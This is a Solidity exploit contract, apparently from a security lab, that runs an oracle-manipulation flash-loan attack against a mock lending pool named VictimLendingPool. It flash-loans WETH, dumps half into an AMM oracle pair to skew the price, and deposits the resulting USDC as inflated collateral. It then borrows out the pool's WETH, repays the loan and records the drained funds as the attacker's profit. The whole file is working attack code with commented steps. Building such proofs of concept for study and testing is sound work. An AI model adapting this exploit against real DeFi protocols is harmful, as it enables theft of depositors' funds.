// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IFlashLoanReceiver, MockFlashLoanProvider} from "../mocks/MockFlashLoanProvider.sol";
import {MockOraclePair} from "../mocks/MockOraclePair.sol";
import {VictimLendingPool} from "../VictimLendingPool.sol";

/// @title FlashLoanAttacker
/// @notice Oracle-manipulation flash-loan attack against VictimLendingPool.
///         Doc 02 sketches this as "USDC flash loan", but with naive
///         constant-product AMM math the profitable direction is to
///         flash-loan the BORROW asset (WETH) and inflate the collateral
///         asset's (USDC) apparent price. Substantively the same exploit
///         class — just the direction the doc's short summary got wrong.
///
/// Flow:
///   1. Flash loan `loanWeth` WETH from MockFlashLoanProvider.
///   2. Swap `dumpWeth` of it into the oracle pair (WETH → USDC). This
///      increases reserve_WETH, decreases reserve_USDC → price(WETH) in
///      USDC drops dramatically → the victim sees each USDC of collateral
///      as being worth far more WETH than it really is.
///   3. Deposit the received USDC into VictimLendingPool as collateral.
///   4. Borrow WETH against that inflated-value collateral, up to LTV
///      and pool liquidity.
///   5. Repay the flash loan from (kept WETH + newly-borrowed WETH).
///      Net WETH = (loan kept) + (borrow) - (loan repaid). Profit = borrow
///      drained from the pool minus the slippage loss on the dump.
contract FlashLoanAttacker is IFlashLoanReceiver {
    VictimLendingPool public immutable victim;
    MockOraclePair public immutable oraclePair;
    IERC20 public immutable usdc;
    IERC20 public immutable weth;
    address public immutable owner;

    // How much of the flash-loaned WETH to dump into the oracle to
    // manipulate the price. Expressed in basis points (of the loan).
    uint256 public constant DUMP_BPS = 5000; // 50%
    uint256 public constant BPS_DENOM = 10000;

    uint256 public lastDrainedWeth;
    uint256 public lastNetProfitWeth;

    event AttackStarted(address indexed attacker, uint256 flashLoanAmount);
    event AttackSucceeded(uint256 drainedWeth, uint256 netProfitWeth);

    constructor(address _victim, address _oraclePair, address _usdc, address _weth) {
        require(_victim != address(0), "FlashLoanAttacker: zero victim");
        owner = msg.sender;
        victim = VictimLendingPool(_victim);
        oraclePair = MockOraclePair(_oraclePair);
        usdc = IERC20(_usdc);
        weth = IERC20(_weth);
    }

    /// @notice Entry point. Flash-loan WETH from `flashLoanProvider`
    ///         and run the attack inside `onFlashLoan`.
    function attack(address flashLoanProvider, uint256 loanWeth) external {
        require(msg.sender == owner, "FlashLoanAttacker: not owner");
        emit AttackStarted(msg.sender, loanWeth);
        MockFlashLoanProvider(flashLoanProvider).flashLoan(loanWeth, address(this), "");
    }

    function onFlashLoan(address token, uint256 amount, bytes calldata) external override {
        require(token == address(weth), "FlashLoanAttacker: expected WETH");
        uint256 wethBalanceAtStart = weth.balanceOf(address(this));
        // After the loan has been sent: balance == amount (pre-condition
        // assuming attacker held none to begin with).

        // --- 1. Dump WETH into oracle pair (WETH → USDC) ---
        uint256 dumpAmount = (amount * DUMP_BPS) / BPS_DENOM;
        require(weth.approve(address(oraclePair), dumpAmount), "FlashLoanAttacker: approve dump");
        oraclePair.swap(address(weth), dumpAmount);

        // --- 2. Deposit received USDC as collateral ---
        uint256 usdcBalance = usdc.balanceOf(address(this));
        require(usdcBalance > 0, "FlashLoanAttacker: dump yielded no USDC");
        require(usdc.approve(address(victim), usdcBalance), "FlashLoanAttacker: approve deposit");
        victim.deposit(usdcBalance);

        // --- 3. Borrow WETH at the manipulated price ---
        uint256 poolWeth = weth.balanceOf(address(victim));
        require(poolWeth > 0, "FlashLoanAttacker: no victim liquidity");
        uint256 usdcPerEthNow = oraclePair.getPrice(address(weth));
        uint256 collateralInWeth = (usdcBalance * 1e18) / usdcPerEthNow;
        uint256 maxBorrow = (collateralInWeth * 8000) / BPS_DENOM; // LTV_BPS
        uint256 borrowAmount = maxBorrow < poolWeth ? maxBorrow : poolWeth;
        require(borrowAmount > 0, "FlashLoanAttacker: nothing to borrow");
        victim.borrow(borrowAmount);
        lastDrainedWeth = borrowAmount;

        // --- 4. Repay the flash loan ---
        //   Held now: loan (minus dumped) + freshly borrowed.
        //   Need to send `amount` WETH back to the provider (msg.sender).
        uint256 wethOnHand = weth.balanceOf(address(this));
        require(wethOnHand >= amount, "FlashLoanAttacker: cannot repay loan");
        require(weth.transfer(msg.sender, amount), "FlashLoanAttacker: repay");

        // Profit tracking: anything WETH left on this contract is the
        // attacker's take.
        uint256 wethAfterRepay = weth.balanceOf(address(this));
        lastNetProfitWeth = wethAfterRepay;

        // (Suppress unused-warning without touching the value.)
        wethBalanceAtStart;

        emit AttackSucceeded(lastDrainedWeth, lastNetProfitWeth);
    }
}
